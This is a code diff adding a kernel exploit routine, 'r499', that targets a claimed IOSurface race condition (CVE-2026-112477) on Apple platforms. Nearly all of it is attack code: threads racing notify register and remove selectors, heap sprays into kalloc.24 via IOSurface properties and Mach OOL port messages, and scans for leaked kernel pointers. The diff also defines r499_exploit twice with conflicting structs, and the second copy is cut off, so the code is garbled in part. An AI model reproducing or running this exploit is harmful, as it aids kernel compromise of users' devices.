@@ -26940,6 +26940,663 @@ static int r498_encode_one(VTCompressionSessionRef enc) {
     return r498_outlen;
 }
 
+/* ====================================================================
+ * r499: CVE-2026-112477 IOSurface sel 17/18 Race Condition Exploit
+ *
+ * IOSurfaceRootUserClient selectors:
+ *   17 = register_notify: 2 scalar inputs {surface_id, flags}
+ *   18 = remove_notify:   1 scalar input  {surface_id}
+ *
+ * Race between register and remove creates stale entry in kalloc.24.
+ * After free, spray controlled data into kalloc.24, then trigger
+ * the stale entry to leak kernel pointers.
+ * ==================================================================== */
+
+struct r499_race_ctx {
+    io_connect_t conn;
+    uint32_t surface_id;
+    mach_port_t wake_port;
+    volatile int *go;
+    volatile int done;
+    kern_return_t kr;
+    int use_async;
+};
+
+static void *r499_register_thread(void *arg) {
+    struct r499_race_ctx *ctx = (struct r499_race_ctx *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    while (!*ctx->go) __asm__ volatile("yield");
+
+    if (ctx->use_async && ctx->wake_port != MACH_PORT_NULL) {
+        uint64_t ref[1] = { 0 };
+        uint64_t si[2] = { ctx->surface_id, 0 };
+        ctx->kr = IOConnectCallAsyncMethod(ctx->conn, 17,
+            ctx->wake_port, ref, 1,
+            si, 2, NULL, 0,
+            NULL, NULL, NULL, NULL);
+    } else {
+        uint64_t si[2] = { ctx->surface_id, 0 };
+        uint32_t oc = 0;
+        ctx->kr = IOConnectCallMethod(ctx->conn, 17, si, 2, NULL, 0, NULL, &oc, NULL, NULL);
+    }
+    ctx->done = 1;
+    return NULL;
+}
+
+static void *r499_remove_thread(void *arg) {
+    struct r499_race_ctx *ctx = (struct r499_race_ctx *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    while (!*ctx->go) __asm__ volatile("yield");
+
+    if (ctx->use_async && ctx->wake_port != MACH_PORT_NULL) {
+        uint64_t ref[1] = { 0 };
+        uint64_t si[1] = { ctx->surface_id };
+        ctx->kr = IOConnectCallAsyncMethod(ctx->conn, 18,
+            ctx->wake_port, ref, 1,
+            si, 1, NULL, 0,
+            NULL, NULL, NULL, NULL);
+    } else {
+        uint64_t si[1] = { ctx->surface_id };
+        uint32_t oc = 0;
+        ctx->kr = IOConnectCallMethod(ctx->conn, 18, si, 1, NULL, 0, NULL, &oc, NULL, NULL);
+    }
+    ctx->done = 1;
+    return NULL;
+}
+
+static void r499_exploit(void) {
+    rlog("\n=== r499: CVE-2026-112477 IOSurface sel 17/18 race ===\n\n");
+    fflush(stdout);
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Open IOSurfaceRoot user client */
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    IOObjectRelease(svc);
+    rlog("IOSurfaceRoot: svc=0x%x conn=0x%x kr=0x%x\n", svc, conn, kr);
+    if (kr != KERN_SUCCESS || !conn) {
+        rlog("FATAL: Cannot open IOSurfaceRoot\n");
+        return;
+    }
+
+    /* Create surface properties */
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = 64, h = 64, bpe = 4, bpr = 256, pf = 0x42475241;
+    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef brn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), brn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+
+    /* ================================================================
+     * Phase 1: Probe sel 17/18 calling convention
+     * ================================================================ */
+    rlog("\n--- Phase 1: Probe sel 17/18 ---\n");
+    fflush(stdout);
+
+    IOSurfaceRef probe_surf = IOSurfaceCreate(props);
+    uint32_t probe_id = IOSurfaceGetID(probe_surf);
+    rlog("  Probe surface: id=%u\n", probe_id);
+
+    /* Test sel 17 with surface ID */
+    uint64_t si17[2] = { probe_id, 0 };
+    uint32_t oc17 = 0;
+    kr = IOConnectCallMethod(conn, 17, si17, 2, NULL, 0, NULL, &oc17, NULL, NULL);
+    rlog("  sel17(id=%u, flags=0): kr=0x%x oc=%u\n", probe_id, kr, oc17);
+
+    /* Test sel 17 with flags=1 */
+    si17[1] = 1;
+    kr = IOConnectCallMethod(conn, 17, si17, 2, NULL, 0, NULL, &oc17, NULL, NULL);
+    rlog("  sel17(id=%u, flags=1): kr=0x%x oc=%u\n", probe_id, kr, oc17);
+
+    /* Test sel 18 to remove */
+    uint64_t si18[1] = { probe_id };
+    uint32_t oc18 = 0;
+    kr = IOConnectCallMethod(conn, 18, si18, 1, NULL, 0, NULL, &oc18, NULL, NULL);
+    rlog("  sel18(id=%u): kr=0x%x oc=%u\n", probe_id, kr, oc18);
+
+    /* Test sel 17 with 1 scalar, 3 scalars, struct input */
+    uint64_t si17_1[1] = { probe_id };
+    kr = IOConnectCallMethod(conn, 17, si17_1, 1, NULL, 0, NULL, &oc17, NULL, NULL);
+    rlog("  sel17(1 scalar): kr=0x%x\n", kr);
+
+    uint64_t si17_3[3] = { probe_id, 0, 0 };
+    kr = IOConnectCallMethod(conn, 17, si17_3, 3, NULL, 0, NULL, &oc17, NULL, NULL);
+    rlog("  sel17(3 scalars): kr=0x%x\n", kr);
+
+    /* struct input: surface ID as 4-byte struct */
+    uint32_t st17 = probe_id;
+    kr = IOConnectCallMethod(conn, 17, NULL, 0, &st17, 4, NULL, NULL, NULL, NULL);
+    rlog("  sel17(struct 4B): kr=0x%x\n", kr);
+
+    /* Try with struct output to see if kernel returns anything */
+    uint8_t out17[64] = {0};
+    size_t out17_sz = sizeof(out17);
+    uint64_t osc17[4] = {0};
+    uint32_t osc17_cnt = 4;
+    si17[0] = probe_id; si17[1] = 0;
+    kr = IOConnectCallMethod(conn, 17, si17, 2, NULL, 0, osc17, &osc17_cnt, out17, &out17_sz);
+    rlog("  sel17(2sc, out): kr=0x%x osc_cnt=%u out_sz=%zu\n", kr, osc17_cnt, out17_sz);
+    if (osc17_cnt > 0) {
+        for (uint32_t i = 0; i < osc17_cnt && i < 4; i++)
+            rlog("    osc[%d] = 0x%llx\n", i, osc17[i]);
+    }
+    if (out17_sz > 0) {
+        rlog("    out:");
+        for (size_t i = 0; i < out17_sz && i < 32; i++)
+            rlog(" %02x", out17[i]);
+        rlog("\n");
+    }
+
+    CFRelease(probe_surf);
+    rlog("\n");
+
+    /* ================================================================
+     * Phase 2: Race sel 17 vs sel 18
+     *
+     * Strategy: Create a surface, register notification (sel 17),
+     * then race register+remove on the same surface from two threads.
+     * If remove frees the notification struct while register is still
+     * inserting, we get a dangling pointer in the notification list.
+     * ================================================================ */
+    rlog("--- Phase 2: Race sel 17 vs sel 18 ---\n");
+    fflush(stdout);
+
+    int race_rounds = 10000;
+    int r_both_ok = 0, r_reg_fail = 0, r_rem_fail = 0, r_both_fail = 0;
+    int r_interesting = 0;
+
+    /* Use multiple connections to widen the race window */
+    io_connect_t conn2 = 0;
+    io_service_t svc2 = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    IOServiceOpen(svc2, mach_task_self(), 0, &conn2);
+    IOObjectRelease(svc2);
+    rlog("  Second connection: conn2=0x%x\n", conn2);
+
+    for (int round = 0; round < race_rounds; round++) {
+        IOSurfaceRef s = IOSurfaceCreate(props);
+        if (!s) continue;
+        uint32_t sid = IOSurfaceGetID(s);
+
+        /* Pre-register notification to have something to race against */
+        uint64_t pre_si[2] = { sid, 0 };
+        uint32_t pre_oc = 0;
+        IOConnectCallMethod(conn, 17, pre_si, 2, NULL, 0, NULL, &pre_oc, NULL, NULL);
+
+        /* Set up race: register on conn2 vs remove on conn */
+        volatile int go = 0;
+        struct r499_race_ctx reg_ctx = { .conn = conn2, .surface_id = sid, .go = &go, .done = 0 };
+        struct r499_race_ctx rem_ctx = { .conn = conn, .surface_id = sid, .go = &go, .done = 0 };
+
+        pthread_t t_reg, t_rem;
+        pthread_create(&t_reg, NULL, r499_register_thread, &reg_ctx);
+        pthread_create(&t_rem, NULL, r499_remove_thread, &rem_ctx);
+
+        usleep(10);  /* Let threads reach spin loop */
+        __sync_synchronize();
+        go = 1;
+
+        pthread_join(t_reg, NULL);
+        pthread_join(t_rem, NULL);
+
+        int reg_ok = (reg_ctx.kr == KERN_SUCCESS);
+        int rem_ok = (rem_ctx.kr == KERN_SUCCESS);
+
+        if (reg_ok && rem_ok) r_both_ok++;
+        else if (!reg_ok && rem_ok) r_reg_fail++;
+        else if (reg_ok && !rem_ok) r_rem_fail++;
+        else r_both_fail++;
+
+        /* Interesting: register succeeds but remove also succeeds —
+         * the notification may have been double-freed or the new
+         * registration may reference freed memory */
+        if (reg_ok && rem_ok) {
+            r_interesting++;
+        }
+
+        /* Try a second remove — if it also succeeds, the entry may
+         * still be in the list (double-free or stale entry) */
+        if (reg_ok) {
+            uint64_t si_rem2[1] = { sid };
+            uint32_t oc_rem2 = 0;
+            kern_return_t kr2 = IOConnectCallMethod(conn2, 18, si_rem2, 1, NULL, 0,
+                NULL, &oc_rem2, NULL, NULL);
+            if (kr2 == KERN_SUCCESS && round < 20) {
+                rlog("  [%d] Second remove OK — may indicate stale entry\n", round);
+            }
+        }
+
+        CFRelease(s);
+
+        if (round > 0 && round % 2000 == 0) {
+            rlog("  round %d: both_ok=%d reg_fail=%d rem_fail=%d both_fail=%d\n",
+                round, r_both_ok, r_reg_fail, r_rem_fail, r_both_fail);
+            fflush(stdout);
+        }
+    }
+
+    rlog("\nPhase 2 result (%d rounds):\n", race_rounds);
+    rlog("  both_ok=%d reg_fail=%d rem_fail=%d both_fail=%d\n",
+        r_both_ok, r_reg_fail, r_rem_fail, r_both_fail);
+    rlog("  interesting (potential stale)=%d\n", r_interesting);
+    rlog("\n");
+    fflush(stdout);
+
+    /* ================================================================
+     * Phase 3: Race + Spray + Read-back
+     *
+     * After winning the race (stale entry in kalloc.24), spray
+     * IOSurface properties into kalloc.24 containing marker values.
+     * Then try to read back through the stale entry path.
+     * ================================================================ */
+    rlog("--- Phase 3: Race + Spray + Read-back ---\n");
+    fflush(stdout);
+
+    #define R499_SPRAY_COUNT 256
+    IOSurfaceRef spray_surfs[R499_SPRAY_COUNT];
+    int spray_created = 0;
+
+    /* Pre-create spray surfaces */
+    for (int i = 0; i < R499_SPRAY_COUNT; i++) {
+        spray_surfs[i] = IOSurfaceCreate(props);
+        if (spray_surfs[i]) spray_created++;
+    }
+    rlog("  Pre-created %d spray surfaces\n", spray_created);
+
+    int p3_rounds = 5000;
+    int p3_hits = 0;
+    int p3_kptr_found = 0;
+
+    for (int round = 0; round < p3_rounds; round++) {
+        IOSurfaceRef victim = IOSurfaceCreate(props);
+        if (!victim) continue;
+        uint32_t vid = IOSurfaceGetID(victim);
+
+        /* Register notification */
+        uint64_t reg_si[2] = { vid, 0 };
+        uint32_t reg_oc = 0;
+        IOConnectCallMethod(conn, 17, reg_si, 2, NULL, 0, NULL, &reg_oc, NULL, NULL);
+
+        /* Race: register on conn2 vs remove on conn */
+        volatile int go3 = 0;
+        struct r499_race_ctx reg3 = { .conn = conn2, .surface_id = vid, .go = &go3, .done = 0 };
+        struct r499_race_ctx rem3 = { .conn = conn, .surface_id = vid, .go = &go3, .done = 0 };
+
+        pthread_t t3_reg, t3_rem;
+        pthread_create(&t3_reg, NULL, r499_register_thread, &reg3);
+        pthread_create(&t3_rem, NULL, r499_remove_thread, &rem3);
+
+        usleep(5);
+        __sync_synchronize();
+        go3 = 1;
+
+        pthread_join(t3_reg, NULL);
+        pthread_join(t3_rem, NULL);
+
+        /* If both succeeded, we may have a stale entry — spray now */
+        if (reg3.kr == KERN_SUCCESS && rem3.kr == KERN_SUCCESS) {
+            /* Spray 24-byte values into kalloc.24 via IOSurface properties */
+            char pkey[32];
+            uint8_t pdata[24];
+            /* Fill with recognizable marker */
+            memset(pdata, 0, 24);
+            uint64_t marker = 0xAAAABBBB00000000ULL | round;
+            memcpy(pdata, &marker, 8);
+            memcpy(pdata + 8, &marker, 8);
+            memcpy(pdata + 16, &marker, 8);
+
+            CFDataRef pval = CFDataCreate(NULL, pdata, 24);
+
+            /* Spray across many surfaces */
+            for (int i = 0; i < R499_SPRAY_COUNT; i++) {
+                if (!spray_surfs[i]) continue;
+                snprintf(pkey, sizeof(pkey), "z%d_%d", round, i);
+                CFStringRef pk = CFStringCreateWithCString(NULL, pkey, kCFStringEncodingUTF8);
+                IOSurfaceSetValue(spray_surfs[i], pk, pval);
+                CFRelease(pk);
+            }
+            CFRelease(pval);
+
+            /* Now try to trigger the stale entry by registering on the
+             * victim surface again — if the freed notify struct was
+             * replaced by our spray data, the kernel will traverse
+             * our fake data */
+            uint64_t trig_si[2] = { vid, 1 };
+            uint32_t trig_oc = 0;
+            kern_return_t trig_kr = IOConnectCallMethod(conn, 17, trig_si, 2, NULL, 0,
+                NULL, &trig_oc, NULL, NULL);
+
+            /* Check spray surfaces for unexpected data */
+            for (int i = 0; i < R499_SPRAY_COUNT && p3_kptr_found < 20; i++) {
+                if (!spray_surfs[i]) continue;
+                /* Read back the property we set */
+                snprintf(pkey, sizeof(pkey), "z%d_%d", round, i);
+                CFStringRef pk = CFStringCreateWithCString(NULL, pkey, kCFStringEncodingUTF8);
+                CFTypeRef rv = IOSurfaceCopyValue(spray_surfs[i], pk);
+                if (rv) {
+                    if (CFGetTypeID(rv) == CFDataGetTypeID()) {
+                        CFDataRef rd = (CFDataRef)rv;
+                        CFIndex len = CFDataGetLength(rd);
+                        if (len == 24) {
+                            uint64_t read_marker = 0;
+                            CFDataGetBytes(rd, CFRangeMake(0, 8), (uint8_t *)&read_marker);
+                            uint64_t expected = 0xAAAABBBB00000000ULL | round;
+                            if (read_marker != expected) {
+                                p3_hits++;
+                                uint64_t vals[3];
+                                CFDataGetBytes(rd, CFRangeMake(0, 24), (uint8_t *)vals);
+                                rlog("  [%d][%d] CORRUPTED: %016llx %016llx %016llx\n",
+                                    round, i, vals[0], vals[1], vals[2]);
+                                for (int v = 0; v < 3; v++) {
+                                    if ((vals[v] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                        rlog("  *** KPTR at [%d]: 0x%016llx ***\n", v, vals[v]);
+                                        p3_kptr_found++;
+                                    }
+                                }
+                            }
+                        } else if (len != 24) {
+                            p3_hits++;
+                            rlog("  [%d][%d] SIZE CHANGED: %ld (expected 24)\n",
+                                round, i, (long)len);
+                        }
+                    }
+                    CFRelease(rv);
+                }
+                CFRelease(pk);
+            }
+
+            /* Clean up spray properties for this round */
+            for (int i = 0; i < R499_SPRAY_COUNT; i++) {
+                if (!spray_surfs[i]) continue;
+                snprintf(pkey, sizeof(pkey), "z%d_%d", round, i);
+                CFStringRef pk = CFStringCreateWithCString(NULL, pkey, kCFStringEncodingUTF8);
+                IOSurfaceRemoveValue(spray_surfs[i], pk);
+                CFRelease(pk);
+            }
+
+            if (trig_kr != KERN_SUCCESS && round < 20)
+                rlog("  [%d] trigger re-register: kr=0x%x\n", round, trig_kr);
+        }
+
+        CFRelease(victim);
+
+        if (round > 0 && round % 1000 == 0) {
+            rlog("  round %d: hits=%d kptrs=%d\n", round, p3_hits, p3_kptr_found);
+            fflush(stdout);
+        }
+    }
+
+    rlog("\nPhase 3 result (%d rounds):\n", p3_rounds);
+    rlog("  corrupted reads=%d kernel pointers=%d\n", p3_hits, p3_kptr_found);
+    rlog("\n");
+    fflush(stdout);
+
+    /* ================================================================
+     * Phase 4: Mach port OOL spray into kalloc.24
+     *
+     * Instead of IOSurface properties (which may not land in kalloc.24),
+     * use OOL mach port descriptors. Each port pointer is 8 bytes,
+     * 3 pointers = 24 bytes = kalloc.24 allocation.
+     * ================================================================ */
+    rlog("--- Phase 4: Mach port OOL spray variant ---\n");
+    fflush(stdout);
+
+    /* Create a bunch of ports we can spray as OOL descriptors */
+    #define R499_PORT_COUNT 1024
+    mach_port_t spray_ports[R499_PORT_COUNT];
+    int ports_created = 0;
+    for (int i = 0; i < R499_PORT_COUNT; i++) {
+        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray_ports[i]);
+        if (kr == KERN_SUCCESS) {
+            mach_port_insert_right(mach_task_self(), spray_ports[i],
+                spray_ports[i], MACH_MSG_TYPE_MAKE_SEND);
+            ports_created++;
+        } else {
+            spray_ports[i] = MACH_PORT_NULL;
+        }
+    }
+    rlog("  Created %d spray ports\n", ports_created);
+
+    int p4_rounds = 3000;
+    int p4_oob = 0;
+
+    /* Send messages with OOL port descriptors to fill kalloc.24 */
+    for (int round = 0; round < p4_rounds; round++) {
+        IOSurfaceRef victim4 = IOSurfaceCreate(props);
+        if (!victim4) continue;
+        uint32_t vid4 = IOSurfaceGetID(victim4);
+
+        /* Register notify */
+        uint64_t reg4_si[2] = { vid4, 0 };
+        uint32_t reg4_oc = 0;
+        IOConnectCallMethod(conn, 17, reg4_si, 2, NULL, 0, NULL, &reg4_oc, NULL, NULL);
+
+        /* Race */
+        volatile int go4 = 0;
+        struct r499_race_ctx reg4 = { .conn = conn2, .surface_id = vid4, .go = &go4, .done = 0 };
+        struct r499_race_ctx rem4 = { .conn = conn, .surface_id = vid4, .go = &go4, .done = 0 };
+
+        pthread_t t4r, t4d;
+        pthread_create(&t4r, NULL, r499_register_thread, &reg4);
+        pthread_create(&t4d, NULL, r499_remove_thread, &rem4);
+
+        usleep(5);
+        __sync_synchronize();
+        go4 = 1;
+
+        pthread_join(t4r, NULL);
+        pthread_join(t4d, NULL);
+
+        if (reg4.kr == KERN_SUCCESS && rem4.kr == KERN_SUCCESS) {
+            /* Spray OOL ports: 3 ports * 8 bytes = 24 bytes → kalloc.24 */
+            mach_port_t ool_ports[3];
+            for (int i = 0; i < 3; i++)
+                ool_ports[i] = spray_ports[round % ports_created];
+
+            /* Send many messages with OOL port arrays to fill freed slots */
+            mach_port_t hold_port = MACH_PORT_NULL;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &hold_port);
+
+            for (int sp = 0; sp < 64; sp++) {
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_ports_descriptor_t ool;
+                } msg = {0};
+
+                msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX |
+                    MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+                msg.hdr.msgh_size = sizeof(msg);
+                msg.hdr.msgh_remote_port = hold_port;
+                msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                msg.body.msgh_descriptor_count = 1;
+                msg.ool.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+                msg.ool.address = ool_ports;
+                msg.ool.count = 3;
+                msg.ool.disposition = MACH_MSG_TYPE_COPY_SEND;
+                msg.ool.deallocate = 0;
+                msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
+
+                mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0,
+                    MACH_PORT_NULL, 0, MACH_PORT_NULL);
+            }
+
+            /* Now try to trigger the stale notification entry */
+            uint64_t trig4_si[2] = { vid4, 1 };
+            uint32_t trig4_oc = 0;
+            kern_return_t trig4_kr = IOConnectCallMethod(conn, 17, trig4_si, 2, NULL, 0,
+                NULL, &trig4_oc, NULL, NULL);
+
+            /* Check if kernel read our port pointers as the notify struct */
+            /* The trigger itself may have panicked if it dereferenced a port
+             * pointer as a function pointer. If we're still alive, check
+             * the IOSurface properties for any leaked data */
+            CFTypeRef all_vals = IOSurfaceCopyAllValues(victim4);
+            if (all_vals) {
+                if (CFGetTypeID(all_vals) == CFDictionaryGetTypeID()) {
+                    CFIndex cnt = CFDictionaryGetCount((CFDictionaryRef)all_vals);
+                    if (cnt > 0 && round < 20) {
+                        rlog("  [%d] victim has %ld properties after race\n", round, cnt);
+                    }
+                }
+                CFRelease(all_vals);
+            }
+
+            /* Drain hold port messages */
+            mach_port_destroy(mach_task_self(), hold_port);
+        }
+
+        CFRelease(victim4);
+
+        if (round > 0 && round % 500 == 0) {
+            rlog("  round %d: oob=%d\n", round, p4_oob);
+            fflush(stdout);
+        }
+    }
+
+    rlog("\nPhase 4 result: oob=%d\n\n", p4_oob);
+    fflush(stdout);
+
+    /* ================================================================
+     * Phase 5: Alternative approach — sel 9/10 property store exploit
+     *
+     * IOSurface's s_set_value (sel 9) and s_get_value (sel 10)
+     * go through the kernel. After the UAF, if the notification
+     * struct is replaced with a surface property entry, kernel
+     * reads from the stale entry may return property buffer pointers.
+     * ================================================================ */
+    rlog("--- Phase 5: Property store read-back via sel 9/10 ---\n");
+    fflush(stdout);
+
+    int p5_rounds = 3000;
+    int p5_data_leaked = 0;
+
+    for (int round = 0; round < p5_rounds; round++) {
+        IOSurfaceRef v5 = IOSurfaceCreate(props);
+        if (!v5) continue;
+        uint32_t vid5 = IOSurfaceGetID(v5);
+
+        /* Set a property with known data */
+        uint8_t known_data[24];
+        memset(known_data, 0, 24);
+        uint64_t sentinel = 0xDEAD000000000000ULL | (round & 0xFFFF);
+        memcpy(known_data, &sentinel, 8);
+
+        IOSurfaceSetValue(v5, CFSTR("_xprobe"), CFDataCreate(NULL, known_data, 24));
+
+        /* Register notify, then race register/remove */
+        uint64_t r5_si[2] = { vid5, 0 };
+        uint32_t r5_oc = 0;
+        IOConnectCallMethod(conn, 17, r5_si, 2, NULL, 0, NULL, &r5_oc, NULL, NULL);
+
+        volatile int go5 = 0;
+        struct r499_race_ctx reg5 = { .conn = conn2, .surface_id = vid5, .go = &go5, .done = 0 };
+        struct r499_race_ctx rem5 = { .conn = conn, .surface_id = vid5, .go = &go5, .done = 0 };
+
+        pthread_t t5r, t5d;
+        pthread_create(&t5r, NULL, r499_register_thread, &reg5);
+        pthread_create(&t5d, NULL, r499_remove_thread, &rem5);
+
+        usleep(3);
+        __sync_synchronize();
+        go5 = 1;
+
+        pthread_join(t5r, NULL);
+        pthread_join(t5d, NULL);
+
+        if (reg5.kr == KERN_SUCCESS && rem5.kr == KERN_SUCCESS) {
+            /* Race won — spray properties on OTHER surfaces to fill kalloc.24 */
+            for (int i = 0; i < 64 && i < R499_SPRAY_COUNT; i++) {
+                if (!spray_surfs[i]) continue;
+                uint8_t sd[24];
+                memset(sd, 0x41 + (i & 0xF), 24);
+                CFDataRef sdv = CFDataCreate(NULL, sd, 24);
+                char sk[16];
+                snprintf(sk, sizeof(sk), "q%d", i);
+                CFStringRef skk = CFStringCreateWithCString(NULL, sk, kCFStringEncodingUTF8);
+                IOSurfaceSetValue(spray_surfs[i], skk, sdv);
+                CFRelease(sdv);
+                CFRelease(skk);
+            }
+
+            /* Read back victim's property — may now contain stale data */
+            CFTypeRef rb = IOSurfaceCopyValue(v5, CFSTR("_xprobe"));
+            if (rb) {
+                if (CFGetTypeID(rb) == CFDataGetTypeID()) {
+                    CFDataRef rd = (CFDataRef)rb;
+                    CFIndex len = CFDataGetLength(rd);
+                    uint64_t rbvals[3] = {0};
+                    CFDataGetBytes(rd, CFRangeMake(0, len < 24 ? len : 24), (uint8_t *)rbvals);
+
+                    if (rbvals[0] != sentinel || len != 24) {
+                        p5_data_leaked++;
+                        rlog("  [%d] LEAK: len=%ld vals=%016llx %016llx %016llx\n",
+                            round, (long)len, rbvals[0], rbvals[1], rbvals[2]);
+                        for (int v = 0; v < 3; v++) {
+                            if ((rbvals[v] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                rlog("  *** KPTR[%d]: 0x%016llx ***\n", v, rbvals[v]);
+                            }
+                        }
+                    }
+                }
+                CFRelease(rb);
+            }
+
+            /* Cleanup spray properties */
+            for (int i = 0; i < 64 && i < R499_SPRAY_COUNT; i++) {
+                if (!spray_surfs[i]) continue;
+                char sk[16];
+                snprintf(sk, sizeof(sk), "q%d", i);
+                CFStringRef skk = CFStringCreateWithCString(NULL, sk, kCFStringEncodingUTF8);
+                IOSurfaceRemoveValue(spray_surfs[i], skk);
+                CFRelease(skk);
+            }
+        }
+
+        IOSurfaceRemoveValue(v5, CFSTR("_xprobe"));
+        CFRelease(v5);
+
+        if (round > 0 && round % 500 == 0) {
+            rlog("  round %d: leaked=%d\n", round, p5_data_leaked);
+            fflush(stdout);
+        }
+    }
+
+    rlog("\nPhase 5 result: data_leaked=%d\n\n", p5_data_leaked);
+    fflush(stdout);
+
+    /* Cleanup */
+    for (int i = 0; i < R499_SPRAY_COUNT; i++)
+        if (spray_surfs[i]) CFRelease(spray_surfs[i]);
+
+    for (int i = 0; i < R499_PORT_COUNT; i++)
+        if (spray_ports[i] != MACH_PORT_NULL)
+            mach_port_deallocate(mach_task_self(), spray_ports[i]);
+
+    if (conn2) IOServiceClose(conn2);
+    if (conn) IOServiceClose(conn);
+
+    CFRelease(props); CFRelease(wn); CFRelease(hn);
+    CFRelease(bn); CFRelease(brn); CFRelease(pfn);
+
+    rlog("\n=== r499 Summary ===\n");
+    rlog("Phase 2 race: both_ok=%d interesting=%d\n", r_both_ok, r_interesting);
+    rlog("Phase 3 spray: hits=%d kptrs=%d\n", p3_hits, p3_kptr_found);
+    rlog("Phase 4 OOL: oob=%d\n", p4_oob);
+    rlog("Phase 5 prop: leaked=%d\n", p5_data_leaked);
+    rlog("=== r499 complete ===\n\n");
+    fflush(stdout);
+}
+
 static void r498_exploit(void) {
     rlog("\n=== r498: Bitstream comparison + PropertyMode ===\n\n");
     fflush(stdout);
@@ -27120,6 +27777,465 @@ static void r498_exploit(void) {
 
 r498_done:
     rlog("\n=== r498 complete ===\n");
+    fflush(stdout);
+}
+
+/* ============================================================
+ * r499: IOSurface sel 17/18 async race + kalloc spray + kptr leak
+ * CVE-2026-112477: Race between s_set_surface_notify (sel 17) and
+ * s_remove_surface_notify (sel 18) leaves stale entry in registry.
+ * Combined with IOSurface property spray for kernel pointer readback.
+ * ============================================================ */
+
+#include <pthread.h>
+
+struct race_ctx {
+    io_connect_t conn;
+    uint32_t surface_id;
+    mach_port_t notify_port;
+    volatile int go;
+    volatile int stop;
+    volatile int insert_count;
+    volatile int remove_count;
+    volatile int insert_errs;
+    volatile int remove_errs;
+};
+
+static void *race_insert_thread(void *arg) {
+    struct race_ctx *ctx = (struct race_ctx *)arg;
+    while (!ctx->go) usleep(1);
+
+    while (!ctx->stop) {
+        uint64_t reference[8] = {0};
+        uint32_t referenceCnt = 1;
+        uint64_t scalar[2] = {ctx->surface_id, 0};
+        kern_return_t kr = IOConnectCallAsyncMethod(
+            ctx->conn, 17, ctx->notify_port,
+            reference, referenceCnt,
+            scalar, 1,
+            NULL, 0,
+            NULL, NULL, NULL, NULL);
+        if (kr == 0)
+            __sync_fetch_and_add(&ctx->insert_count, 1);
+        else
+            __sync_fetch_and_add(&ctx->insert_errs, 1);
+    }
+    return NULL;
+}
+
+static void *race_remove_thread(void *arg) {
+    struct race_ctx *ctx = (struct race_ctx *)arg;
+    while (!ctx->go) usleep(1);
+
+    while (!ctx->stop) {
+        uint64_t scalar[2] = {ctx->surface_id, 0};
+        kern_return_t kr = IOConnectCallMethod(
+            ctx->conn, 18,
+            scalar, 1,
+            NULL, 0,
+            NULL, NULL, NULL, NULL);
+        if (kr == 0)
+            __sync_fetch_and_add(&ctx->remove_count, 1);
+        else
+            __sync_fetch_and_add(&ctx->remove_errs, 1);
+    }
+    return NULL;
+}
+
+static void r499_exploit(void) {
+    rlog("\n=== r499: IOSurface sel 17/18 async race + kptr leak ===\n\n");
+    fflush(stdout);
+
+    /* Phase 1: Open IOSurfaceRoot and create surface */
+    rlog("--- Phase 1: Setup ---\n");
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    if (!svc) { rlog("  IOSurfaceRoot not found\n"); goto r499_done; }
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    rlog("  IOServiceOpen: kr=%d conn=0x%x\n", kr, conn);
+    if (kr != 0) { IOObjectRelease(svc); goto r499_done; }
+
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = 64, h = 64, bpr = 256, as = 16384, pf = 0x42475241;
+    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nb = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef na = CFNumberCreate(NULL, kCFNumberIntType, &as);
+    CFNumberRef nf = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nb);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), na);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nf);
